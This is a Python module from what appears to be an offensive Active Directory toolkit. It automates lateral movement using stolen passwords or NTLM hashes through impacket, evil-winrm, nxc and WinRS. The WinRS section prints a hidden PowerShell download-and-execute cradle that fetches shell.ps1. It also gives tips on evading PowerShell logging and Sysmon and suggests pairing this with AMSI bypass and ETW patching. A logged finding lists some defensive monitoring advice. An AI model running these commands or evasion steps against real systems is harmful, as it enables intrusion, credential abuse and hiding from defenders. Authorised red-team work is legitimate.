"""
Module: Lateral Movement
Techniques: PtH, WMIexec, PSExec, SMBexec, Evil-WinRM, DCOM, RDP, AtExec
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("LATERAL MOVEMENT")
    dc   = input_or_session("dc_ip",    "Target IP / Host")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    nth  = input_or_session("nt_hash",  "NTLM Hash (blank if using password)")

    print("""
  [1]  PSExec      (SMB + Service)
  [2]  WMIExec     (WMI)
  [3]  SMBExec     (semi-interactive)
  [4]  Evil-WinRM  (WinRM 5985)
  [5]  DCOM Exec   (MMC20)
  [6]  Pass-the-Hash via CrackMapExec
  [7]  RDP Enable & Connect
  [8]  AtExec      (Task Scheduler)
  [9]  WinRS       (WinRM without PS logging — AD-Advanced)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    target = SESSION.get("dc_fqdn") if SESSION.get("use_kerberos") and SESSION.get("dc_fqdn") else dc
    auth_imp = impacket_auth_target(target, user, pw, nth, dom)
    cme_auth = nxc_auth(user, pw, nth, dom, dc)
    winrm_auth = evil_winrm_auth(target, user, pw, nth, dom)

    if c == "1":
        run_cmd(f"{imp('psexec.py')} {auth_imp}")
    elif c == "2":
        run_cmd(f"{imp('wmiexec.py')} {auth_imp}")
    elif c == "3":
        run_cmd(f"{imp('smbexec.py')} {auth_imp}")
    elif c == "4":
        run_cmd(f"evil-winrm {winrm_auth}")
    elif c == "5":
        run_cmd(f"{imp('dcomexec.py')} {auth_imp} 'whoami'")
    elif c == "6":
        cmd = prompt("Command to run")
        run_cmd(f"nxc smb {shell_quote(dc)} {cme_auth} -x {shell_quote(cmd)}")
    elif c == "7":
        run_cmd(f"nxc smb {shell_quote(dc)} {cme_auth} -M rdp -o ACTION=enable")
        info(f"Connect: xfreerdp /u:{user} /pth:{nth} /v:{dc}")
    elif c == "8":
        cmd = prompt("Command")
        run_cmd(f"{imp('atexec.py')} {auth_imp} {shell_quote(cmd)}")

    elif c == "9":
        target = prompt("Target hostname or IP")
        cmd    = prompt("Command to run [cmd.exe]") or "cmd.exe"
        print(f"""
  {C}WinRS — Windows Remote Shell (lateral movement without PS logging):{RST}

  {Y}Basic shell:{RST}
  winrs -r:{target} -u:{dom}\\{user} -p:{pw if pw else "<password>"} {cmd}

  {Y}Run single command (no interactive shell):{RST}
  winrs -r:{target} -u:{dom}\\{user} -p:{pw if pw else "<password>"} "whoami /all"
  winrs -r:{target} -u:{dom}\\{user} -p:{pw if pw else "<password>"} "ipconfig"
  winrs -r:{target} -u:{dom}\\{user} -p:{pw if pw else "<password>"} "net localgroup administrators"

  {Y}Drop and execute payload:{RST}
  winrs -r:{target} -u:{dom}\\{user} -p:{pw if pw else "<password>"} \\
    "powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://{dc}/shell.ps1'))"

  {Y}Why WinRS over PSExec/WMI:{RST}
  {DIM}• Uses WinRM (TCP 5985) — same port as Evil-WinRM
  • Does NOT create Windows PowerShell process (no Sysmon Event ID 1 for powershell.exe)
  • Does NOT require SMB (no service install like PSExec)
  • Commands run under winrshost.exe — lower detection profile
  • OPSEC: combine with AMSI bypass and ETW patch inside the shell{RST}

  {Y}Check if WinRM is running on target:{RST}
  Test-WSMan -ComputerName {target}
  nxc winrm {target} {cme_auth}

  {Y}Enable WinRM on target (if you have local admin):{RST}
  winrs -r:{target} -u:{dom}\\{user} -p:{pw if pw else "<password>"} \\
    "winrm quickconfig -q"
""")
        add_finding("WinRS Lateral Movement", "High",
                    f"WinRS used for lateral movement to {target} — no PowerShell logging artifacts",
                    "Monitor WinRM connections (Event ID 91, 168); restrict WinRM access via firewall; audit winrshost.exe process creations")

    pause()
